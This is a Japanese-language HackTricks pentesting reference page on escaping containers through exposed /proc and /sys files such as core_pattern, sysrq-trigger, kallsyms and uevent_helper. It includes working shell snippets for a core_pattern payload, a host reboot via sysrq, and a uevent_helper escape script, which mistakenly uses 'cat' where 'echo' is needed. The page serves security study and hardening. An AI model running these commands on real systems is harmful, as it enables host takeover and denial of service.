<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


(_**この情報は**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts) **から取得されました**_)

ネームスペースのサポートがないため、`/proc`と`/sys`の公開は、重要な攻撃面と情報漏洩の源となります。`procfs`と`sysfs`内の多くのファイルは、コンテナの脱出、ホストの変更、または基本的な情報漏洩のリスクを提供し、他の攻撃を容易にする可能性があります。

これらのテクニックを悪用するためには、単に`-v /proc:/host/proc`のように何かを**誤って設定するだけで十分**です。なぜなら、**AppArmorはパスベースであるため、/host/procを保護しない**からです。

# procfs

## /proc/sys

`/proc/sys`は通常、`sysctl(2)`を介して制御されるカーネル変数の変更を許可します。

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html)は、コアファイルの生成時（通常はプログラムのクラッシュ時）に実行されるプログラムを定義し、このファイルの最初の文字がパイプ記号`|`である場合、コアファイルが標準入力として渡されます。このプログラムはrootユーザーによって実行され、最大128バイトのコマンドライン引数を許可します。これにより、コンテナホスト内での簡単なコード実行が可能になります。これは、クラッシュとコアファイルの生成（悪意のある行動の多くで簡単に破棄できる）があれば、コンテナホスト内でのトリビアルなコード実行が可能になるためです。
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html)は、カーネルモジュールローダーのパスを含んでいます。このパスは、[modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html)コマンドを使用してカーネルモジュールをロードする際に呼び出されます。カーネルがカーネルモジュールのロードを試みるアクション（例えば、現在ロードされていない暗号モジュールをcrypto-APIを使用してロードする、または現在使用されていないデバイスのネットワーキングモジュールをifconfigを使用してロードする）を実行することで、コードの実行が可能になります。
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html)は、カーネルがメモリ不足（OOM）の状態に達した場合にパニックするかどうかを決定するグローバルフラグです（OOMキラーを呼び出す代わりに）。これはコンテナの脱出ではなく、よりむしろホストにのみ利用可能であるべき機能を公開するもので、サービス拒否（DoS）攻撃と言えます。

### /proc/sys/fs

[/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html)ディレクトリには、クォータ、ファイルハンドル、inode、およびdentry情報など、ファイルシステムのさまざまな側面に関するオプションと情報の配列が含まれています。このディレクトリへの書き込みアクセスは、ホストに対してさまざまなサービス拒否攻撃を可能にします。

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html)は、さまざまな**インタプリタが非ネイティブバイナリ**形式（Javaなど）に基づいて登録されることが通常のさまざまなバイナリ形式を実行することを許可します。カーネルにバイナリを登録してハンドラとして実行させることができます。\
[https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc)にエクスプロイトがあります: _Poor man's rootkit, leverage_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst)_'s_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _option to escalate privilege through any suid binary (and to get a root shell) if `/proc/sys/fs/binfmt_misc/register` is writeable._

このテクニックの詳細な説明については、[https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)を参照してください。

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html)は、`CONFIG_IKCONFIG_PROC`の設定に応じて、実行中のカーネルの設定オプションの圧縮バージョンを公開します。これにより、侵害されたまたは悪意のあるコンテナが、カーネルで有効になっている脆弱な領域を簡単に特定して攻撃することができる場合があります。

## /proc/sysrq-trigger

`Sysrq`は、特別な`SysRq`キーボードの組み合わせを介して呼び出すことができる古いメカニズムです。これにより、システムの即時再起動、`sync(2)`の発行、すべてのファイルシステムの読み取り専用での再マウント、カーネルデバッガの呼び出し、その他の操作が可能になります。

ゲストが適切に分離されていない場合、`/proc/sysrq-trigger`ファイルに文字を書き込むことで、[sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html)コマンドをトリガーすることができます。
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html)は通常`dmesg`を介してアクセスされるカーネルリングバッファメッセージを公開することができます。この情報の公開は、カーネルのエクスプロイトを支援し、カーネルアドレスの漏洩（カーネルアドレススペース配置ランダム化（KASLR）の防御に役立つ可能性があります）、およびカーネル、ハードウェア、ブロックされたパケット、その他のシステムの詳細に関する一般的な情報開示の源となります。

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html)には、動的およびロード可能なモジュールのためのカーネルエクスポートされたシンボルとそのアドレスのリストが含まれています。これには、カーネルのイメージの物理メモリ内の位置も含まれており、カーネルエクスプロイトの開発に役立ちます。これらの場所から、カーネルのベースアドレスまたはオフセットを見つけることができ、これを使用してカーネルアドレススペース配置ランダム化（KASLR）を克服することができます。

`kptr_restrict`が`1`または`2`に設定されているシステムでは、このファイルは存在しますが、アドレス情報は提供されません（ただし、シンボルのリストの順序はメモリ内の順序と同じです）。

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html)は、カーネルメモリデバイス`/dev/mem`へのインターフェースを公開します。PID Namespaceは、この`procfs`ベクターを介した一部の攻撃から保護するかもしれませんが、この領域は歴史的に脆弱であり、安全と考えられていましたが、特権昇格のために再び脆弱性が見つかりました。

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html)はシステムの物理メモリを表し、ELFコア形式（通常はコアダンプファイルで見つかります）です。これには、そのメモリへの書き込みは許可されていません。このファイルを読むことができる（特権ユーザーに制限されています）と、ホストシステムおよび他のコンテナからメモリの内容が漏洩する可能性があります。

大きな報告されたファイルサイズは、アーキテクチャの物理的にアドレス指定可能なメモリの最大量を表しており、それを読むことで問題が発生することがあります（またはソフトウェアの脆弱性に応じてクラッシュすることがあります）。

[2019年に/proc/kcoreをダンプする](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem`は[/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html)の代替インターフェースです（cgroupデバイスホワイトリストによって直接アクセスがブロックされています）。これはカーネル仮想メモリを表すキャラクタデバイスファイルで、読み書きの両方が可能であり、カーネルメモリを直接変更することができます。

## /proc/mem

`/proc/mem`は[/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html)の代替インターフェースです（cgroupデバイスホワイトリストによって直接アクセスがブロックされています）。これはシステムの物理メモリを表すキャラクタデバイスファイルで、読み書きの両方が可能であり、すべてのメモリの変更が可能です（ただし、`kmem`よりも少し洗練された操作が必要です。仮想アドレスを物理アドレスに変換する必要があります）。

## /proc/sched\_debug

`/proc/sched_debug`は、システム全体のプロセススケジューリング情報を返す特別なファイルです。この情報には、プロセスの名前とプロセスIDだけでなく、プロセスのcgroup識別子も含まれます。これにより、PID名前空間の保護をバイパスすることができ、他のユーザー/ワールドから読み取り可能なので、特権のないコンテナでも悪用される可能性があります。

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html)には、プロセスのマウント名前空間のマウントポイントに関する情報が含まれています。これにより、コンテナの`rootfs`またはイメージの場所が公開されます。

# sysfs

## /sys/kernel/uevent\_helper

`uevent`は、デバイスが追加または削除されたときにカーネルによってトリガーされるイベントです。特に、`uevent_helper`のパスは、`/sys/kernel/uevent_helper`に書き込むことで変更できます。その後、`uevent`がトリガーされると（これは`/sys/class/mem/null/uevent`などのファイルに書き込むことによってユーザーランドからも行うことができます）、悪意のある`uevent_helper`が実行されます。
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

ACPIおよびさまざまなハードウェア設定にアクセスできます。これは通常、ノートパソコンやゲーミングマザーボードに見られます。これにより、コンテナホストに対するDoS攻撃が可能になり、物理的な損害を引き起こす可能性もあります。

## /sys/kernel/vmcoreinfo

このファイルは、KASLRを打破するために使用できるカーネルアドレスを漏洩する可能性があります。

## /sys/kernel/security

`/sys/kernel/security`には、Linuxセキュリティモジュールの設定を可能にする`securityfs`インターフェースがマウントされています。これにより、[AppArmorポリシー](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor)の設定が可能になり、コンテナがMACシステムを無効にすることができます。

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars`は、NVRAM内のEFI変数とのやり取りのためのインターフェースを公開します。これは通常、ほとんどのサーバーには関係ありませんが、EFIはますます人気が高まっています。許可の弱点により、一部のノートパソコンが壊れることさえあります。

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars`は、UEFIブート引数用のNVRAMに書き込むためのインターフェースを提供します。これらを変更すると、ホストマシンが起動不能になる可能性があります。

## /sys/kernel/debug

`debugfs`は、カーネル（またはカーネルモジュール）がユーザーランドからアクセス可能なデバッグインターフェースを作成できる「ルールのない」インターフェースを提供します。過去にいくつかのセキュリティの問題があり、ファイルシステムの「ルールのない」ガイドラインはしばしばセキュリティの制約と衝突してきました。

# 参考文献

* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)または[telegramグループ](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**

- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
